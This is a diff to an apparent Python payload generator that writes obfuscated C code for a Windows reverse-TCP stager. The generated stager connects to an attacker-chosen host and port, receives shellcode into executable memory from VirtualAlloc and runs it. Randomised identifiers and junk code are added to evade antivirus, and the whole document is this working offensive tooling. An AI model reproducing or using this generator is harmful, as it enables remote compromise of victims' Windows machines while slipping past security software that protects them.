@@ -148,10 +148,9 @@ WinEvasion_07 = windows_evasion()
 WinEvasion_08 = windows_evasion()
 WinEvasion_09 = windows_evasion()
 
+
 Hollow_code = ""
 
-
-Hollow_code += "#define _WIN32_WINNT 0x0500\n"
 Hollow_code += "#include <winsock2.h>\n"
 
 Include_List = ["#include <stdlib.h>\n","#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <time.h>\n","#include <math.h>\n"]
@@ -194,16 +193,16 @@ Hollow_code += "if (WSAStartup(" + Randversion + ", &" + Randwsadata + ") < 0){\
 Hollow_code += Junkcode_07
 Hollow_code += "WSACleanup();exit(1);}\n"
 Hollow_code += "struct hostent * " + RandRevtarget + ";struct sockaddr_in " + Randsock + ";SOCKET " + RandSocket + ";\n"
-Hollow_code += RandSocket + " = socket(AF_INET, SOCK_STREAM, 0);\n"
+Hollow_code += "" + RandSocket + " = socket(AF_INET, SOCK_STREAM, 0);\n"
 Hollow_code += Junkcode_08
 Hollow_code += "if (" + RandSocket + " == INVALID_SOCKET){" + Junkcode_09 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
-Hollow_code += RandRevtarget + " = gethostbyname(\"" + Lhost + "\");\n"     #Lhost
+Hollow_code += "" + RandRevtarget + " = gethostbyname(\"" + Lhost + "\");\n"     #Lhost
 Hollow_code += "if (" + RandRevtarget + " == NULL){" + Junkcode_10 + " closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
 Hollow_code += "memcpy(&" + Randsock + ".sin_addr.s_addr, " + RandRevtarget + "->h_addr, " + RandRevtarget + "->h_length);\n"
 Hollow_code += Junkcode_11
-Hollow_code += Randsock + ".sin_family = AF_INET;\n"
+Hollow_code += "" + Randsock + ".sin_family = AF_INET;\n"
 Hollow_code += Junkcode_12
-Hollow_code += Randsock + ".sin_port = htons((" + Lport + "));\n"        #Lport
+Hollow_code += "" + Randsock + ".sin_port = htons((" + Lport + "));\n"        #Lport
 Hollow_code += fake_funcname2 + "();\n"
 Hollow_code += "if ( connect(" + RandSocket + ", (struct sockaddr *)&" + Randsock + ", sizeof(" + Randsock + ")) ){ " + Junkcode_13 + "closesocket(" + RandSocket + ");WSACleanup();exit(1);}\n"
 Hollow_code += Junkcode_14
@@ -218,7 +217,7 @@ Hollow_code += Randpointer1 + " = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_EXEC
 Hollow_code += "char * " + Randpointer2 + " = " + Randpointer1 + ";\n"
 Hollow_code += "int " + RandRecv_int + ";\n"
 Hollow_code += "do {" + RandRecv_int + " = recv(" + RandSocket + ", " + Randpointer2 + ", 1024, 0);\n"
-Hollow_code += "" + Randpointer2 + " += " + RandRecv_int + ";\n"
+Hollow_code += Randpointer2 + " += " + RandRecv_int + ";\n"
 Hollow_code += "}while ( " + RandRecv_int + " > 0 );\n"
 Hollow_code += Junkcode_18
 Hollow_code += "closesocket(" + RandSocket + "); WSACleanup();\n"
@@ -228,7 +227,7 @@ Hollow_code += "}}}}\n"
 Hollow_code += "}else{" + Junkcode_19 + "}\n"
 Hollow_code += "}else{" + Junkcode_20 + "}\n"
 Hollow_code += "}else{" + Junkcode_21 + "}\n"
-Hollow_code += "}else{" + Junkcode_22 + "}\n" 
+Hollow_code += "}else{" + Junkcode_22 + "}\n"
 Hollow_code += "}return 0;}"
 Hollow_code = Hollow_code.encode('utf-8')
 
